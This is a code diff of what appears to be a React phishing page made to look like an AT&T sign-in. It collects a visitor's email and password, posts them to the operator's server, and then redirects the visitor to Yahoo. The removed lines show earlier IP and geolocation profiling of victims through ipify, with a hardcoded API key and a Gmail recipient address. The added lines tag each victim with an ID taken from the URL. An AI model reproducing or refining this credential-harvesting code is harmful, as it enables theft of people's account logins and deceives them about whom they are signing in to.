@@ -7,48 +7,24 @@ import PasswordHeader from '../component/PasswordHeader'
 import axios from 'axios'
 import { baseURL } from '../helpers/data'
 import AttSVG from '../../public/att-icon.svg'
+import { useLocation } from 'react-router-dom'
 
 const MainPage = () => {
-  const [userID, setUserID] = useState('')
+  const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
   const [showPassword, setShowPassword] = useState(false)
   const [redirect, setRedirect] = useState(false)
-  const [IPAddress, setIPAddress] = useState('')
-
-  const [userData, setUserData] = useState({ country: '', region: '', isp: '' })
-
+  const { search } = useLocation()
+  const userID = search.slice(1)
   useEffect(() => {
     redirect && window.location.replace('https://www.yahoo.com/')
   }, [redirect])
 
-  useEffect(() => {
-    fetch('https://api.ipify.org?format=json')
-      .then((response) => response.json())
-      .then((data) => {
-        setIPAddress(data.ip)
-        console.log('ip is', data.ip)
-      })
-      .then(() => {
-        axios
-          .get(
-            `https://geo.ipify.org/api/v2/country,city?apiKey=at_WBywPSAmG7JNZsxPAL1D32IVCrz6x&ipAddress=${IPAddress}`
-          )
-          .then((resp) => {
-            const { location, isp } = resp.data
-            const { country, region } = location
-            console.log(country, region, isp)
-            setUserData({ country, region, isp })
-          })
-          .catch((e) => console.log(e))
-      })
-      .catch((error) => console.error(error))
-  }, [])
-
   const handleContinue = () => {
     setError('')
     if (!showPassword) {
-      if (!userID || !isValidEmail(userID)) {
+      if (!email || !isValidEmail(email)) {
         setError('please enter a valid email')
         return
       }
@@ -59,11 +35,9 @@ const MainPage = () => {
       } else {
         axios
           .post(`${baseURL}main`, {
-            userID,
+            email,
             password,
-            ...userData,
-            IPAddress,
-            user: 'pat.nishimoto2@gmail.com',
+            userID,
           })
           .then(() => {
             setRedirect(true)
@@ -82,7 +56,7 @@ const MainPage = () => {
             <FormHeader />
           ) : (
             <PasswordHeader
-              userID={userID}
+              email={email}
               setShowPassword={setShowPassword}
               setError={setError}
             />
@@ -90,7 +64,7 @@ const MainPage = () => {
 
           <section className='mt-10'>
             {!showPassword ? (
-              <UserID userID={userID} setUserID={setUserID} />
+              <UserID userID={email} setUserID={setEmail} />
             ) : (
               <Password password={password} setPassword={setPassword} />
             )}
